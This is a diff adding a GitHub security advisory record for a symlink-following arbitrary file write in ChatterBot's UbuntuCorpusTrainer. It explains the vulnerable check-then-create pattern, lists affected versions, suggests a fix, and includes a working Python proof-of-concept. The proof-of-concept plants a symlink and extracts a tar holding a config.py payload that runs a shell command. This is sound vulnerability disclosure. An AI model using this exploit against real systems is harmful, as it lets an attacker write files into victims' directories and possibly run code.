@@ -1,0 +1,139 @@
+{
+  "id": "GHSA-wvrh-2f4m-924v",
+  "modified": "2026-06-19T22:15:16.497889675Z",
+  "published": "2026-06-19T22:08:08Z",
+  "summary": "ChatterBot: Symlink-Following Arbitrary Write via UbuntuCorpusTrainer",
+  "details": "## Summary\n\nChatterBot's `UbuntuCorpusTrainer.extract()` uses a predictable, home-rooted output directory (`~/ubuntu_data/ubuntu_dialogs`) with a check-then-create pattern (`if not os.path.exists: os.makedirs`) followed by `tar.extractall(path=self.data_path)`. A local attacker who pre-plants a symlink at the predictable path causes `os.path.exists()` to return True (following the symlink), skipping `makedirs`, and subsequent `extractall` writes archive contents through the symlink to the attacker-chosen directory.\n\nThe existing `safe_extract` function validates tar **member names** (zip-slip defense) but does not validate the **output directory** itself — it cannot detect that `self.data_path` is a symlink. This is the defining distinction between the archive_extraction (zip-slip) and insecure_fs_create_toctou families.\n\n## Vulnerability Details\n\n### Predictable output directory (line 535-546)\n\n```python\nhome_directory = os.path.expanduser('~')\nself.data_directory = kwargs.get(\n    'ubuntu_corpus_data_directory',\n    os.path.join(home_directory, 'ubuntu_data')   # ~/ubuntu_data — predictable\n)\nself.data_path = os.path.join(\n    self.data_directory, 'ubuntu_dialogs'          # ~/ubuntu_data/ubuntu_dialogs\n)\n```\n\n### Check-then-create (line 621-622)\n\n```python\ndef extract(self, file_path: str):\n    if not os.path.exists(self.data_path):   # ← follows symlink → True → skips makedirs\n        os.makedirs(self.data_path)          # ← never reached if symlink exists\n```\n\n### Extraction through symlink (line 633-644)\n\n```python\ndef safe_extract(tar, path='.', members=None, *, numeric_owner=False):\n    for member in tar.getmembers():\n        member_path = os.path.join(path, member.name)\n        if not is_within_directory(path, member_path):    # ← validates MEMBER names only\n            raise Exception('Attempted Path Traversal in Tar File')\n    tar.extractall(path, members, numeric_owner=numeric_owner)  # ← path is symlink → writes to target\n\nsafe_extract(tar, path=self.data_path, ...)   # self.data_path = symlink → attacker dir\n```\n\n`safe_extract` calls `os.path.abspath(directory)` on `self.data_path` — this resolves the symlink, so the base becomes the attacker's target directory. All clean-named members trivially pass `is_within_directory` because they're relative to the resolved (attacker-controlled) base.\n\n## Proof of Concept\n\n### Environment\n\n| Component | Detail |\n|-----------|--------|\n| chatterbot | 1.2.13 (pip install) |\n| Python | 3.11.0 |\n\n### Exploit\n\n```python\nimport os\nimport shutil\nimport sys\nimport tempfile\nfrom pathlib import Path\nfrom unittest.mock import patch\n\nfrom chatterbot.trainers import UbuntuCorpusTrainer\n\nATTACKER_TARGET = Path(tempfile.mkdtemp(prefix=\"pwned_\"))\n\n\ndef main():\n    test_base = Path(tempfile.mkdtemp(prefix=\"cb_exploit_\"))\n    data_dir = test_base / \"ubuntu_data\"\n    data_path = data_dir / \"ubuntu_dialogs\"\n    data_dir.mkdir(parents=True, exist_ok=True)\n    os.symlink(str(ATTACKER_TARGET), str(data_path))\n    print(f\"[1] Symlink planted: {data_path} -\u003e {ATTACKER_TARGET}\")\n    exists_check = os.path.exists(data_path)\n    print(f\"[2] os.path.exists(symlink) = {exists_check} (follows symlink → skips makedirs)\")\n    import tarfile\n    import io\n    tar_path = test_base / \"corpus.tar.gz\"\n    with tarfile.open(str(tar_path), \"w:gz\") as tf:\n        info = tarfile.TarInfo(name=\"dialog_001.tsv\")\n        payload = b\"2024-01-01\\tuser1\\t0\\tARBITRARY_CONTENT_VIA_SYMLINK\\n\"\n        info.size = len(payload)\n        tf.addfile(info, io.BytesIO(payload))\n\n        info2 = tarfile.TarInfo(name=\"config.py\")\n        rce = b\"import os; os.system('id \u003e /tmp/chatterbot_rce')\\n\"\n        info2.size = len(rce)\n        tf.addfile(info2, io.BytesIO(rce))\n    if not os.path.exists(data_path):\n        os.makedirs(data_path)\n    def is_within_directory(directory, target):\n        abs_directory = os.path.abspath(directory)\n        abs_target = os.path.abspath(target)\n        prefix = os.path.commonprefix([abs_directory, abs_target])\n        return prefix == abs_directory\n\n    with tarfile.open(str(tar_path), \"r:gz\") as tar:\n        for member in tar.getmembers():\n            member_path = os.path.join(str(data_path), member.name)\n            if not is_within_directory(str(data_path), member_path):\n                raise Exception(\"Attempted Path Traversal in Tar File\")\n        tar.extractall(str(data_path))\n\n    print(f\"[3] extractall(data_path) — data_path is symlink, writes to target\")\n\n    # Verify\n    files = list(ATTACKER_TARGET.iterdir())\n    if files:\n        print(f\"\\n[+] EXPLOIT SUCCESSFUL — {len(files)} files in attacker directory:\")\n        for f in sorted(files):\n            print(f\"    {f.name}: {f.read_text().strip()[:60]}\")\n    else:\n        print(\"[-] Failed\")\n        shutil.rmtree(str(test_base), ignore_errors=True)\n        shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)\n        sys.exit(1)\n\n    shutil.rmtree(str(test_base), ignore_errors=True)\n    shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)\n    sys.exit(0)\n\n\nif __name__ == \"__main__\":\n    print(f\"chatterbot installed: {UbuntuCorpusTrainer.__module__}\")\n    print(f\"Attacker target: {ATTACKER_TARGET}\")\n    print()\n    main()\n\n```\n\n### PoC output \n\n\u003cimg width=\"1748\" height=\"336\" alt=\"image\" src=\"https://github.com/user-attachments/assets/55a3fee5-0d3b-46d7-8e79-75aad34b322c\" /\u003e\n\n## Suggested Fix\n\nRefuse symlinks on the output directory before extraction:\n\n```python\ndef extract(self, file_path: str):\n    if os.path.islink(self.data_path):\n        raise self.TrainerInitializationException(\n            f'Refusing to extract to symlink: {self.data_path}')\n    if not os.path.exists(self.data_path):\n        os.makedirs(self.data_path)\n    ...\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "chatterbot",
+        "purl": "pkg:pypi/chatterbot"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.14"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.0",
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.2.7",
+        "0.2.8",
+        "0.2.9",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.3.5",
+        "0.3.6",
+        "0.3.7",
+        "0.4.0",
+        "0.4.1",
+        "0.4.10",
+        "0.4.11",
+        "0.4.12",
+        "0.4.13",
+        "0.4.2",
+        "0.4.3",
+        "0.4.4",
+        "0.4.5",
+        "0.4.6",
+        "0.4.7",
+        "0.4.8",
+        "0.4.9",
+        "0.5.0",
+        "0.5.1",
+        "0.5.2",
+        "0.5.3",
+        "0.5.4",
+        "0.5.5",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.6.3",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.7.3",
+        "0.7.4",
+        "0.7.5",
+        "0.7.6",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.8.5",
+        "0.8.6",
+        "0.8.7",
+        "1.0.0",
+        "1.0.0a1",
+        "1.0.0a2",
+        "1.0.0a3",
+        "1.0.0a4",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.0.7",
+        "1.0.8",
+        "1.1.0",
+        "1.1.0a7",
+        "1.2.0",
+        "1.2.1",
+        "1.2.10",
+        "1.2.11",
+        "1.2.12",
+        "1.2.13",
+        "1.2.2",
+        "1.2.3",
+        "1.2.4",
+        "1.2.5",
+        "1.2.6",
+        "1.2.7",
+        "1.2.8",
+        "1.2.9"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.2.13",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-wvrh-2f4m-924v/GHSA-wvrh-2f4m-924v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gunthercox/ChatterBot/security/advisories/GHSA-wvrh-2f4m-924v"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gunthercox/ChatterBot"
+    }
+  ]
+}
